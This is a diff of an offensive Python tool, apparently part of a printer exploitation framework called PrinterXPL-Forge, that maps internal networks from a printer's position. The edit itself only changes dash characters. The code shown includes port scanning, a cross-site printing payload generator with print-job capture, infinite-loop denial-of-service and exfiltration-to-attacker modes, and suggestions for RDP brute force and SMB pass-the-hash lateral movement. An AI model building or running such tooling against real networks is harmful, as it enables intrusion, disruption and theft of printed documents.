@@ -1,25 +1,25 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PrinterXPL-Forge — Network Mapper (Printer-Perspective)
+PrinterXPL-Forge  -  Network Mapper (Printer-Perspective)
 =====================================================
 Maps everything reachable FROM the printer's network position.
 
-A network printer sits inside the LAN — often on a trusted segment, behind
+A network printer sits inside the LAN  -  often on a trusted segment, behind
 firewalls that only block inbound connections from outside. This module uses
 the printer itself as a recon platform to map the internal network.
 
 Techniques used:
-  A. SNMP-based network info  — routing table, ARP cache, interface list,
+  A. SNMP-based network info   -  routing table, ARP cache, interface list,
                                 connected subnets, DNS servers
-  B. SSRF-based host/port scan — IPP print-by-reference timing analysis
-  C. PJL network variables     — IP config, WINS, gateway, DNS, DHCP lease
-  D. PS/IPP route query        — PostScript systemdict network info
+  B. SSRF-based host/port scan  -  IPP print-by-reference timing analysis
+  C. PJL network variables      -  IP config, WINS, gateway, DNS, DHCP lease
+  D. PS/IPP route query         -  PostScript systemdict network info
   E. Web interface network config page scraping
-  F. WSD device listing        — other WSD devices on the same segment
-  G. mDNS/Bonjour neighbors    — devices announcing on multicast
-  H. CORS spoofing payload gen — JavaScript XSP payload for web attacker
-  I. Windows Spooler recon     — SMB-based print server discovery
+  F. WSD device listing         -  other WSD devices on the same segment
+  G. mDNS/Bonjour neighbors     -  devices announcing on multicast
+  H. CORS spoofing payload gen  -  JavaScript XSP payload for web attacker
+  I. Windows Spooler recon      -  SMB-based print server discovery
 
 Attack surface extensions from printer position:
   - Reach internal web apps (HTTP to private IPs)
@@ -541,14 +541,14 @@ def discover_network(
         subnet:  CIDR (e.g. '192.168.1.0/24'). Auto-derived from printer_ip if None.
         ports:   Ports to probe per host. Uses a focused set if None.
         workers: Parallel threads for scanning (default 50 for speed).
-        timeout: TCP connect timeout in seconds (default 0.8s — fast LAN scan).
+        timeout: TCP connect timeout in seconds (default 0.8s  -  fast LAN scan).
     """
     if subnet is None:
         parts   = printer_ip.rsplit('.', 1)
         subnet  = parts[0] + '.0/24'
 
     if ports is None:
-        # Focused set covering the most impactful services — fast scan
+        # Focused set covering the most impactful services  -  fast scan
         ports = [22, 23, 80, 135, 139, 443, 445, 515, 548, 554,
                  631, 3389, 5900, 5985, 8080, 8443, 9100, 27017]
 
@@ -653,10 +653,10 @@ def generate_xsp_payload(
     to internal printer port 9100 via XMLHttpRequest.
 
     Attack types:
-      'info'     — retrieve printer model via CORS spoofing
-      'capture'  — inject print job capture PostScript
-      'dos'      — inject infinite loop DoS
-      'exfil'    — retrieve captured jobs and send to attacker URL
+      'info'      -  retrieve printer model via CORS spoofing
+      'capture'   -  inject print job capture PostScript
+      'dos'       -  inject infinite loop DoS
+      'exfil'     -  retrieve captured jobs and send to attacker URL
 
     Args:
         printer_ip:   Target printer IP (discovered via WebRTC or subnet scan).
@@ -671,7 +671,7 @@ def generate_xsp_payload(
         printer_port = _PC.resolve('raw')
     UEL = r'\x1b%-12345X'
 
-    # PostScript for CORS spoofing — printer acts as HTTP server
+    # PostScript for CORS spoofing  -  printer acts as HTTP server
     cors_ps = (
         f"{UEL}\r\n"
         f"%!\r\n"
@@ -728,7 +728,7 @@ def generate_xsp_payload(
         f"{UEL}\r\n"
     )
 
-    # DoS — infinite loop
+    # DoS  -  infinite loop
     dos_ps = (
         f"{UEL}\r\n"
         f"%!\r\n"
@@ -929,19 +929,19 @@ def _build_attack_paths(nm: NetworkMap) -> None:
         ports = set(host.open_ports)
         ip    = host.ip
 
-        # RDP — direct access to Windows systems
+        # RDP  -  direct access to Windows systems
         if 3389 in ports:
             nm.attack_paths.append(
                 f"RDP brute-force: {ip}:3389 [{host.device_type}] "
                 f"→ lateral movement to Windows host"
             )
-        # SMB — file shares, pass-the-hash
+        # SMB  -  file shares, pass-the-hash
         if 445 in ports:
             nm.attack_paths.append(
                 f"SMB attack: {ip}:445 [{host.device_type}] "
                 f"→ file access, pass-the-hash, lateral movement"
             )
-        # Other printers — chain attack
+        # Other printers  -  chain attack
         if host.device_type == 'printer':
             nm.attack_paths.append(
                 f"Chain attack: {ip} [printer] "
@@ -975,7 +975,7 @@ def _build_attack_paths(nm: NetworkMap) -> None:
 def print_network_map(nm: NetworkMap) -> None:
     """Pretty-print a NetworkMap to stdout."""
     print(f"\n{'='*70}")
-    print(f"  NETWORK MAP — from printer {nm.printer_ip}")
+    print(f"  NETWORK MAP  -  from printer {nm.printer_ip}")
     print(f"{'='*70}")
     print(f"  Gateway    : {nm.gateway or '?'}")
     print(f"  Netmask    : {nm.netmask or '?'}")
